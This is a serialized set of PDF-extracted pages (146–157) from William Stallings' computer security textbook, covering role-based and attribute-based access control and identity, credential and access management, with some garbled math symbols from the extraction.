       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 147, 'page_label': '146'}, page_content='146  CHAPTER 4 / ACCEss ConTRol\\ncomponents of an RBAC system may be configured. RBAC3 contains the functional-\\nity of RBAC0, RBAC1, and RBAC2.\\nBase Model—RBAC0 Figure 4.8b, without the role hierarchy and constraints, \\n contains the four types of entities in an RBAC0 system:\\n• User: An individual that has access to this computer system. Each individual \\nhas an associated user ID.\\n• Role: A named job function within the organization that controls this computer \\nsystem. Typically, associated with each role is a description of the authority and \\nresponsibility conferred on this role, and on any user who assumes this role.\\n• Permission: An approval of a particular mode of access to one or more objects. \\nEquivalent terms are access right, privilege, and authorization.\\n• Session: A mapping between a user and an activated subset of the set of roles \\nto which the user is assigned.\\nThe arrowed lines in Figure 4.8b indicate relationships, or mappings, with a \\nsingle arrowhead indicating one, and a double arrowhead indicating many. Thus, there \\nis a many-to-many relationship between users and roles: One user may have multiple \\nroles, and multiple users may be assigned to a single role. Similarly, there is a many-\\nto-many relationship between roles and permissions. A session is used to define a \\ntemporary one-to-many relationship between a user and one or more of the roles to \\nwhich the user has been assigned. The user establishes a session with only the roles \\nneeded for a particular task; this is an example of the concept of least privilege.\\nThe many-to-many relationships between users and roles and between roles \\nand permissions provide a flexibility and granularity of assignment not found in con-\\nventional DAC schemes. Without this flexibility and granularity, there is a greater risk \\nthat a user may be granted more access to resources than is needed because of the \\nlimited control over the types of access that can be allowed. The NIST RBAC docu-\\nment gives the following examples: Users may need to list directories and modify \\nexisting files without creating new files, or they may need to append records to a file \\nwithout modifying existing records.\\nRole HieRaRcHies—RBAC1 Role hierarchies provide a means of reflecting the \\nhierarchical structure of roles in an organization. Typically, job functions with greater \\nresponsibility have greater authority to access resources. A subordinate job function \\nmay have a subset of the access rights of the superior job function. Role hierarchies \\nmake use of the concept of inheritance to enable one role to implicitly include access \\nrights associated with a subordinate role.\\nModels Hierarchies Constraints\\nRBAC0 No No\\nRBAC1 Yes No\\nRBAC2 No Yes\\nRBAC3 Yes Yes\\nTable 4.4 Scope RBAC Models\\nM04_STAL0611_04_GE_C04.indd   146 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 148, 'page_label': '147'}, page_content='4.5 / RolE-BAsED ACCEss ConTRol  147\\nFigure 4.9 is an example of a diagram of a role hierarchy. By convention, sub-\\nordinate roles are lower in the diagram. A line between two roles implies the upper \\nrole includes all of the access rights of the lower role, as well as other access rights not \\navailable to the lower role. One role can inherit access rights from multiple subordi-\\nnate roles. For example, in Figure 4.9, the Project Lead role includes all of the access \\nrights of the Production Engineer role and of the Quality Engineer role. More than \\none role can inherit from the same subordinate role. For example, both the Produc-\\ntion Engineer role and the Quality Engineer role include all of the access rights of \\nthe Engineer role. Additional access rights are also assigned to the Production Engi-\\nneer Role, and a different set of additional access rights are assigned to the Quality \\nEngineer role. Thus, these two roles have overlapping access rights, namely, the access \\nrights they share with the Engineer role.\\nconstRaints—RBAC2 Constraints provide a means of adapting RBAC to the \\nspecifics of administrative and security policies in an organization. A constraint is a \\ndefined relationship among roles or a condition related to roles. [SAND96] lists the fol-\\nlowing types of constraints: mutually exclusive roles, cardinality, and prerequisite roles.\\nMutually exclusive roles are roles such that a user can be assigned to only one \\nrole in the set. This limitation could be a static one, or it could be dynamic, in the \\nsense that a user could be assigned only one of the roles in the set for a session. The \\nmutually exclusive constraint supports a separation of duties and capabilities within \\nan organization. This separation can be reinforced or enhanced by use of mutually \\nexclusive permission assignments. With this additional constraint, a mutually exclu-\\nsive set of roles has the following properties:\\n1. A user can only be assigned to one role in the set (either during a session or \\nstatically).\\n2. Any permission (access right) can be granted to only one role in the set.\\nFigure 4.9 Example of Role Hierarchy\\nDirector\\nEngineering dept.\\nEngineer 1\\nProduction\\nEngineer 1\\nQuality\\nEngineer 1\\nProject Lead 1\\nEngineer 2\\nProduction\\nEngineer 2\\nQuality\\nEngineer 2\\nProject Lead 2\\nM04_STAL0611_04_GE_C04.indd   147 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 149, 'page_label': '148'}, page_content='148  CHAPTER 4 / ACCEss ConTRol\\nThus, the set of mutually exclusive roles have non overlapping permissions. If \\ntwo users are assigned to different roles in the set, then the users have non  overlapping \\npermissions while assuming those roles. The purpose of mutually exclusive roles is to \\nincrease the difficulty of collusion among individuals of different skills or divergent \\njob functions to thwart security policies.\\nCardinality refers to setting a maximum number with respect to roles. One such \\nconstraint is to set a maximum number of users that can be assigned to a given role. \\nFor example, a project leader role or a department head role might be limited to a \\nsingle user. The system could also impose a constraint on the number of roles that \\na user is assigned to, or the number of roles a user can activate for a single session. \\nAnother form of constraint is to set a maximum number of roles that can be granted \\na particular permission; this might be a desirable risk mitigation technique for a sensi-\\ntive or powerful permission.\\nA system might be able to specify a prerequisite role, which dictates a user can \\nonly be assigned to a particular role if it is already assigned to some other specified \\nrole. A prerequisite can be used to structure the implementation of the least privilege \\nconcept. In a hierarchy, it might be required that a user can be assigned to a senior \\n(higher) role only if it is already assigned an immediately junior (lower) role. For \\nexample, in Figure 4.9 a user assigned to a Project Lead role must also be assigned to \\nthe subordinate Production Engineer and Quality Engineer roles. Then, if the user \\ndoes not need all of the permissions of the Project Lead role for a given task, the \\nuser can invoke a session using only the required subordinate role. Note the use of \\nprerequisites tied to the concept of hierarchy requires the RBAC3 model.\\n 4.6 ATTRIBUTE-BASED ACCESS CONTROL\\nA relatively recent development in access control technology is the attribute-based \\naccess control (ABAC) model. An ABAC model can define authorizations that \\nexpress conditions on properties of both the resource and the subject. For example, \\nconsider a configuration in which each resource has an attribute that identifies the \\nsubject that created the resource. Then, a single access rule can specify the owner -\\nship privilege for all the creators of every resource. The strength of the ABAC \\napproach is its flexibility and expressive power. [PLAT13] points out that the main \\nobstacle to its adoption in real systems has been concern about the performance \\nimpact of evaluating predicates on both resource and user properties for each access. \\nHowever, for applications such as cooperating Web services and cloud comput -\\ning, this increased performance cost is less noticeable because there is already a \\nrelatively high performance cost for each access. Thus, Web services have been pio-\\nneering technologies for implementing ABAC models, especially through the intro-\\nduction of the eXtensible Access Control Markup Language (XAMCL) [BEUC13], \\nand there is considerable interest in applying the ABAC model to cloud services \\n[IQBA12, YANG12].\\nThere are three key elements to an ABAC model: attributes, which are defined \\nfor entities in a configuration; a policy model, which defines the ABAC policies; and \\nthe architecture model, which applies to policies that enforce access control. We will \\nexamine these elements in turn.\\nM04_STAL0611_04_GE_C04.indd   148 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 150, 'page_label': '149'}, page_content='4.6 / ATTRIBUTE-BAsED ACCEss ConTRol  149\\nAttributes\\nAttributes are characteristics that define specific aspects of the subject, object, envi-\\nronment conditions, and/or requested operations that are predefined and preassigned \\nby an authority. Attributes contain information that indicates the class of informa -\\ntion given by the attribute, a name, and a value (e.g., Class = HospitalRecordsAccess, \\nName = PatientInformationAccess, Value = MFBusinessHoursOnly).\\nThe following are the three types of attributes in the ABAC model:\\n• Subject attributes: A subject is an active entity (e.g., a user, an application, a \\nprocess, or a device) that causes information to flow among objects or changes \\nthe system state. Each subject has associated attributes that define the identity \\nand characteristics of the subject. Such attributes may include the subject’s \\nidentifier, name, organization, job title, and so on. A subject’s role can also be \\nviewed as an attribute.\\n• Object attributes: An object, also referred to as a resource, is a passive (in the \\ncontext of the given request) information system–related entity (e.g., devices, \\nfiles, records, tables, processes, programs, networks, domains) containing or \\nreceiving information. As with subjects, objects have attributes that can be lever-\\naged to make access control decisions. A Microsoft Word document, for example, \\nmay have attributes such as title, subject, date, and author. Object attributes can \\noften be extracted from the metadata of the object. In particular, a variety of \\nWeb service metadata attributes may be relevant for access control purposes, \\nsuch as ownership, service taxonomy, or even Quality of Service (QoS) attributes.\\n• Environment attributes: These attributes have so far been largely ignored in \\nmost access control policies. They describe the operational, technical, and even \\nsituational environment or context in which the information access occurs. For \\nexample, attributes, such as current date and time, the current virus/hacker \\nactivities, and the network’s security level (e.g., Internet vs. intranet), are not \\nassociated with a particular subject nor a resource, but may nonetheless be \\nrelevant in applying an access control policy.\\nABAC is a logical access control model that is distinguishable because it con -\\ntrols access to objects by evaluating rules against the attributes of entities (subject \\nand object), operations, and the environment relevant to a request. ABAC relies \\nupon the evaluation of attributes of the subject, attributes of the object, and a for -\\nmal relationship or access control rule defining the allowable operations for subject-\\nobject attribute combinations in a given environment. All ABAC solutions contain \\nthese basic core capabilities to evaluate attributes and enforce rules or relationships \\nbetween those attributes. ABAC systems are capable of enforcing DAC, RBAC, and \\nMAC concepts. ABAC enables fine-grained access control, which allows for a higher \\nnumber of discrete inputs into an access control decision, providing a bigger set of \\npossible combinations of those variables to reflect a larger and more definitive set \\nof possible rules, policies, or restrictions on access. Thus, ABAC allows an unlimited \\nnumber of attributes to be combined to satisfy any access control rule. Moreover, \\nABAC systems can be implemented to satisfy a wide array of requirements from \\nbasic access control lists through advanced expressive policy models that fully lever-\\nage the flexibility of ABAC.\\nM04_STAL0611_04_GE_C04.indd   149 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 151, 'page_label': '150'}, page_content='150  CHAPTER 4 / ACCEss ConTRol\\nABAC Logical Architecture\\nFigure 4.10 illustrates in a logical architecture the essential components of an ABAC \\nsystem. An access by a subject to an object proceeds according to the following steps:\\n1. A subject requests access to an object. This request is routed to an access control \\nmechanism.\\n2. The access control mechanism is governed by a set of rules (2a) that are defined \\nby a preconfigured access control policy. Based on these rules, the access control \\nmechanism assesses the attributes of the subject (2b), object (2c), and current \\nenvironmental conditions (2d) to determine authorization.\\n3. The access control mechanism grants the subject access to the object if access \\nis authorized, and denies access if it is not authorized.\\nIt is clear from the logical architecture that there are four independent sources \\nof information used for the access control decision. The system designer can decide \\nwhich attributes are important for access control with respect to subjects, objects, and \\nFigure 4.10 ABAC Scenario\\nSubject\\nattributes\\nEnvironmental\\nattributes\\nAccess control\\npolicies\\nAccess\\ncontrol\\nmechanism\\nPermit\\nDeny\\nSubject (user)\\n2a\\n2b 2c 2d\\n1 3\\nClearanceName\\nEtc. Security\\nTemperature Time\\nEtc.\\nObject\\nattributes\\nClassiﬁcation\\nOwnerType\\nEtc.\\nM04_STAL0611_04_GE_C04.indd   150 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 152, 'page_label': '151'}, page_content='4.6 / ATTRIBUTE-BAsED ACCEss ConTRol  151\\nenvironmental conditions. The system designer or other authority can then define \\naccess control policies, in the form of rules, for any desired combination of attri -\\nbutes of subject, object, and environmental conditions. It should be evident that this \\napproach is very powerful and flexible. However, the cost, both in terms of the com-\\nplexity of the design and implementation, and in terms of the performance impact, \\nis likely to exceed that of other access control approaches. This is a trade-off that the \\nsystem authority must make.\\nFigure 4.11, taken from NIST SP 800-162 [Guide to Attribute Based Access Con-\\ntrol (ABAC) Definition and Considerations,  January 2014], provides a useful way \\nof grasping the scope of an ABAC model compared to a DAC model using access \\ncontrol lists (ACLs). This figure not only illustrates the relative complexity of the two \\nmodels, but also clarifies the trust requirements of the two models. A comparison \\nof representative trust relationships (indicated by arrowed lines) for ACL use and \\nABAC use shows that there are many more complex trust relationships required for \\nABAC to work properly. Ignoring the commonalities in both parts of Figure 4.11, \\none\\xa0can observe that with ACLs the root of trust is with the object owner, who ulti-\\nmately enforces the object access rules by provisioning access to the object through \\naddition of a user to an ACL. In ABAC, the root of trust is derived from many sources \\nof which the object owner has no control, such as Subject Attribute Authorities, \\nPolicy Developers, and Credential Issuers. Accordingly, SP 800-162 recommended \\nthat an enterprise governance body be formed to manage all identity, credential, \\nand access management capability deployment and operation and that each sub -\\nordinate organization maintain a similar body to ensure consistency in managing \\nthe deployment and paradigm shift associated with enterprise ABAC implementa -\\ntion. Additionally, it is recommended that an enterprise develop a trust model that \\ncan be used to illustrate the trust relationships and help determine ownership and \\nliability of information and services, needs for additional policy and governance, and \\nrequirements for technical solutions to validate or enforce trust relationships. The \\ntrust model can be used to help influence organizations to share their information \\nwith clear expectations of how that information will be used and protected and to \\nbe able to trust the information and attribute and authorization assertions coming \\nfrom other organizations.\\nABAC Policies\\nA policy is a set of rules and relationships that govern allowable behavior within an \\norganization, based on the privileges of subjects and how resources or objects are to \\nbe protected under which environment conditions. In turn, privileges represent the \\nauthorized behavior of a subject; they are defined by an authority and embodied \\nin a policy. Other terms that are commonly used instead of privileges are rights, \\n authorizations, and entitlements. Policy is typically written from the perspective of \\nthe object that needs protecting, and the privileges available to subjects.\\nWe now define an ABAC policy model, based on the model presented in \\n[YUAN05]. The following conventions are used:\\n1. S, O, and E are subjects, objects, and environments, respectively;\\n2. SAk (1 … k … K), OAm (1 … m … M), and EAn (1 … n … N) are the pre-\\ndefined attributes for subjects, objects, and environments, respectively;\\nM04_STAL0611_04_GE_C04.indd   151 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 153, 'page_label': '152'}, page_content='152  CHAPTER 4 / ACCEss ConTRol\\nFigure 4.11 ACL and ABAC Trust Relationships\\nProper\\ncredential issuance\\nCredential validation\\nNetwork\\nauthentication\\nObject access rule enforcement\\nAccess provisioning\\nGroup management\\nNetwork\\ncredential\\nDigital identity\\nprovisioning\\nStrength of\\ncredential protection\\nPhysical\\naccess\\n(a) ACL Trust Chain\\nIdentity\\ncredential\\nSubject ObjectAuthentication\\nNetwork access Access control list\\nAccess control\\ndecision\\nAccess control\\nenforcement\\nProper\\ncredential issuance\\nCredential validation\\nNetwork\\nauthentication\\nAuthoritative\\nobject attributes\\nObject access rule enforcement\\nAccess provisioning\\nGroup management\\nNetwork\\ncredential\\nDigital identity\\nprovisioning\\nStrength of\\ncredential protection\\nPhysical\\naccess\\n(b) ABAC Trust Chain\\nAuthoritative subject\\nattribute stores\\nAttribute provisioning\\nAttribute integrity\\nCommon subject\\nattribute taxonomy\\nCommon object\\nattribute taxonomy\\nAttribute integrity\\nIdentity\\ncredential\\nSubject\\nattributes\\nObject\\nattributes\\nSubject ObjectAuthentication\\nNetwork access Rules\\nAccess control\\ndecision\\nAccess control\\nenforcement\\n3. ATTR(s), ATTR(o), and ATTR(e) are attribute assignment relations for subject \\ns, object o, and environment e, respectively:\\nATTR(s)/uni2286SA1 × SA2 ×\\xa0...\\xa0× SAK\\nATTR(r)/uni2286OA1 × OA2 ×\\xa0...\\xa0× OAM\\nATTR(o)/uni2286EA1 × EA2 ×\\xa0...\\xa0× EAN \\nM04_STAL0611_04_GE_C04.indd   152 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 154, 'page_label': '153'}, page_content='4.6 / ATTRIBUTE-BAsED ACCEss ConTRol  153\\nWe also use the function notation for the value assignment of individual attributes. \\nFor example:\\nRole(s) = “Service Consumer”\\nServiceOwner(o) = “XYZ, Inc.”\\nCurrentDate(e) = “01-23-2005”\\n4. In the most general form, a Policy Rule, which decides on whether a subject s \\ncan access an object o in a particular environment e, is a Boolean function of the \\nattributes of s, o, and e:\\nRule: can_access (s, o, e)d  f(ATTR(s), ATTR(o), ATTR(e))\\nGiven all the attribute assignments of s, o, and e, if the function’s evaluation is true, \\nthen the access to the resource is granted; otherwise the access is denied.\\n5. A policy rule base or policy store may consist of a number of policy rules, cov-\\nering many subjects and objects within a security domain. The access control \\ndecision process in essence amounts to the evaluation of applicable policy rules \\nin the policy store.\\nNow consider the example of an online entertainment store that streams movies \\nto users for a flat monthly fee. We will use this example to contrast RBAC and ABAC \\napproaches. The store must enforce the following access control policy based on the \\nuser’s age and the movie’s content rating:\\nMovie Rating Users Allowed Access\\nR Age 17 and older\\nPG-13 Age 13 and older\\nG Everyone\\nIn an RBAC model, every user would be assigned one of three roles: Adult, \\nJuvenile, or Child, possibly during registration. There would be three permis -\\nsions created: Can view R-rated movies, Can view PG-13-rated movies, and Can \\nview G-rated movies. The Adult role gets assigned with all three permissions; the \\n Juvenile r ole gets Can view PG-13-rated movies and Can view G-rated movies \\npermissions, and the Child role gets the Can view G-rated movies permission only. \\nBoth the user-to-role and permission-to-role assignments are manual administra -\\ntive tasks.\\nThe ABAC approach to this application does not need to explicitly define roles. \\nInstead, whether a user u can access or view a movie m (in a security environment \\ne which is ignored here) would be resolved by evaluating a policy rule such as the \\nfollowing:\\nR1:can_access(u, m, e) d\\n  (Age(u) ≥ 17 ¿ Rating(m)/uni2208{R, PG-13, G}) ¡\\n  (Age(u) ≥ 13 ¿ Age(u) < 17 ¿ Rating(m)/uni2208{PG-13, G}) ¡\\n  (Age(u) < 13 ¿ Rating(m)/uni2208{G})\\nM04_STAL0611_04_GE_C04.indd   153 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 155, 'page_label': '154'}, page_content='154  CHAPTER 4 / ACCEss ConTRol\\nwhere Age and Rating are the subject attribute and the object attribute, respectively. \\nThe advantage of the ABAC model shown here is that it eliminates the definition and \\nmanagement of static roles, hence eliminating the need for the administrative tasks \\nfor user-to-role assignment and permission-to-role assignment.\\nThe advantage of ABAC is more clearly seen when we impose finer-grained \\npolicies. For example, suppose movies are classified as either New Release or Old \\nRelease, based on release date compared to the current date, and users are classi -\\nfied as Premium User and Regular User, based on the fee they pay. We would like \\nto enforce a policy that only premium users can view new movies. For the RBAC \\nmodel, we would have to double the number of roles, to distinguish each user \\nby\\xa0age and fee, and we would have to double the number of separate permissions \\nas well.\\nIn general, if there are K subject attributes and M object attributes, and if for \\neach attribute, Range() denotes the range of possible values it can take, then the \\nrespective number of roles and permissions required for an RBAC model are:\\nq\\nK\\nk=1\\n Range (SAk) and q\\nM\\nm=1\\n Range (SAm)\\nThus, we can see that as the number of attributes increases to accommodate \\nfiner-grained policies, the number of roles and permissions grows exponentially. \\nIn\\xa0contrast, the ABAC model deals with additional attributes in an efficient way. \\nFor\\xa0this example, the policy R1 defined previously still applies. We need two new \\nrules:\\nR2:can_access(u,  m,  e)d\\n  (MembershipType(u) = Premium) ¡\\n  (MembershipType(u) = Regular ¿ MovieType(m) = OldRelease)\\nR3:can_access(u,  m,  e)d R1 ¿ R2\\nWith the ABAC model, it is also easy to add environmental attributes. Suppose \\nwe wish to add a new policy rule that is expressed in words as follows: Regular users \\nare allowed to view new releases in promotional periods . This would be difficult to \\nexpress in an RBAC model. In an ABAC model, we only need to add a conjunctive \\n(AND) rule that checks to see the environmental attribute today’s date falls in a \\npromotional period.\\n 4.7 IDENTITY, CREDENTIAL, AND ACCESS MANAGEMENT\\nWe now examine some concepts that are relevant to an access control approach \\ncentered on attributes. This section provides an overview of the concept of identity, \\ncredential, and access management (ICAM), and then Section 4.8 will discuss the use \\nof a trust framework for exchanging attributes.\\nICAM is a comprehensive approach to managing and implementing digital \\nidentities (and associated attributes), credentials, and access control. ICAM has been \\ndeveloped by the U.S. government, but is applicable not only to government agencies, \\nM04_STAL0611_04_GE_C04.indd   154 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 156, 'page_label': '155'}, page_content='4.7 / IDEnTITY, CREDEnTIAl, AnD ACCEss MAnAGEMEnT  155\\nbut also may be deployed by enterprises looking for a unified approach to access \\ncontrol. ICAM is designed to:\\n• Create trusted digital identity r epresentations of individuals and what the \\nICAM documents refer to as nonperson entities (NPEs). The latter include \\nprocesses, applications, and automated devices seeking access to a resource.\\n• Bind those identities to credentials that may serve as a proxy for the individual \\nor NPE in access transactions. A credential is an object or data structure that \\nauthoritatively binds an identity (and optionally, additional attributes) to a \\ntoken possessed and controlled by a subscriber.\\n• Use the credentials to provide authorized access to an agency’s resources.\\nFigure 4.12 provides an overview of the logical components of an ICAM archi-\\ntecture. We will examine each of the main components in the following subsections.\\nIdentity Management\\nIdentity management is concerned with assigning attributes to a digital identity and \\nconnecting that digital identity to an individual or NPE. The goal is to establish a \\nFigure 4.12 Identity, Credential, and Access Management (ICAM)\\nCredential Management\\nIdentity federation\\nAccess management\\nProvisioning/deprovisioning\\nSponsorship Enrollment\\nIssuance\\nCredential\\nlifecycle\\nmanagement\\nCredential\\nproduction\\nResource\\nmanagement\\nPrivilege\\nmanagement\\nPolicy\\nmanagement\\nPhysical\\naccess\\nLogical\\naccess\\nExternal\\nagency\\nState or local\\ngovernment\\nBusiness\\npartner\\nCitizen\\nIdentity Management\\nBackground\\ninvestigation On-boarding\\nDigital identity\\nlifecycle\\nmanagement\\nAuthoritative attribute sources\\nM04_STAL0611_04_GE_C04.indd   155 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 157, 'page_label': '156'}, page_content='156  CHAPTER 4 / ACCEss ConTRol\\ntrustworthy digital identity that is independent of a specific application or context. \\nThe traditional, and still most common, approach to access control for applications \\nand programs is to create a digital representation of an identity for the specific use of \\nthe application or program. As a result, maintenance and protection of the identity \\nitself is treated as secondary to the mission associated with the application.  Further, \\nthere is considerable overlap in effort in establishing these application-specific \\nidentities.\\nUnlike accounts used to log on to networks, systems, or applications, enterprise \\nidentity records are not tied to job title, job duties, location, or whether access is needed \\nto a specific system. Those items may become attributes tied to an enterprise identity \\nrecord, and may also become part of what uniquely identifies an individual in a specific \\napplication. Access control decisions will be based on the context and relevant attri-\\nbutes of a user—not solely their identity. The concept of an enterprise identity is that \\nindividuals will have a single digital representation of themselves that can be lever -\\naged across departments and agencies for multiple purposes, including access control.\\nFigure 4.12 depicts the key functions involved in identity management. Estab-\\nlishment of a digital identity typically begins with collecting identity data as part of \\nan enrollment process. A digital identity is often comprised of a set of attributes that \\nwhen aggregated uniquely identify a user within a system or an enterprise. In order to \\nestablish trust in the individual represented by a digital identity, an agency may also \\nconduct a background investigation. Attributes about an individual may be stored in \\nvarious authoritative sources within an agency and linked to form an enterprise view \\nof the digital identity. This digital identity may then be provisioned into applications \\nin order to support physical and logical access (part of Access Management) and \\n de-provisioned when access is no longer required.\\nA final element of identity management is lifecycle management, which \\nincludes the following:\\n• Mechanisms,  policies, and procedures for protecting personal identity \\ninformation\\n• Controlling access to identity data\\n• Techniques for sharing authoritative identity data with applications that need it\\n• Revocation of an enterprise identity\\nCredential Management\\nAs mentioned, a credential is an object or data structure that authoritatively binds \\nan identity (and optionally, additional attributes) to a token possessed and controlled \\nby a subscriber. Examples of credentials are smart cards, private/public cryptographic \\nkeys, and digital certificates. Credential management is the management of the life \\ncycle of the credential. Credential management encompasses the following five logi-\\ncal components:\\n1. An authorized individual sponsors an individual or entity for a credential to  \\nestablish the need for the credential. For example, a department supervisor \\nsponsors a department employee.\\n2. The sponsored individual enrolls for the credential, a process which typically con-\\nsists of identity proofing and the capture of biographic and biometric data. This \\nM04_STAL0611_04_GE_C04.indd   156 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 158, 'page_label': '157'}, page_content='4.7 / IDEnTITY, CREDEnTIAl, AnD ACCEss MAnAGEMEnT  157\\nstep may also involve incorporating authoritative attribute data, maintained by \\nthe identity management component.\\n3. A credential is pr oduced. Depending on the credential type, production may \\ninvolve encryption, the use of a digital signature, the production of a smartcard, \\nor other functions.\\n4. The credential is issued to the individual or NPE.\\n5. Finally, a credential must be maintained over its life cycle, which might include \\nrevocation, reissuance/replacement, reenrollment, expiration, personal identi-\\nfication number (PIN) reset, suspension, or reinstatement.\\nAccess Management\\nThe access management component deals with the management and control of \\nthe ways entities are granted access to resources. It covers both logical and physi -\\ncal access, and may be internal to a system or an external element. The purpose of \\naccess management is to ensure that the proper identity verification is made when an \\nindividual attempts to access security-sensitive buildings, computer systems, or data. \\nThe access control function makes use of credentials presented by those requesting \\naccess and the digital identity of the requestor. Three support elements are needed \\nfor an enterprise-wide access control facility:\\n• Resource management:  This element is concerned with defining rules for a \\nresource that requires access control. The rules would include credential \\nrequirements and what user attributes, resource attributes, and environmental \\nconditions are required for access of a given resource for a given function.\\n• Privilege management: This element is concerned with establishing and main-\\ntaining the entitlement or privilege attributes that comprise an individual’s \\naccess profile. These attributes represent features of an individual that can be \\nused as the basis for determining access decisions to both physical and logical \\nresources. Privileges are considered attributes that can be linked to a digital \\nidentity.\\n• Policy management: This element governs what is allowable and unallowable in \\nan access transaction. That is, given the identity and attributes of the requestor, \\nthe attributes of the resource or object, and environmental conditions, a policy \\nspecifies what actions this user can perform on this object.\\nIdentity Federation\\nIdentity federation addresses two questions:\\n1. How do you trust identities of individuals from external organizations who need \\naccess to your systems?\\n2. How do you vouch for identities of individuals in your organization when they \\nneed to collaborate with external organizations?\\nIdentity federation is a term used to describe the technology, standards, policies, \\nand processes that allow an organization to trust digital identities, identity attributes, \\nand credentials created and issued by another organization. We will discuss identity \\nfederation in the following section.\\nM04_STAL0611_04_GE_C04.indd   157 10/11/17   2:47 PM'),\n",
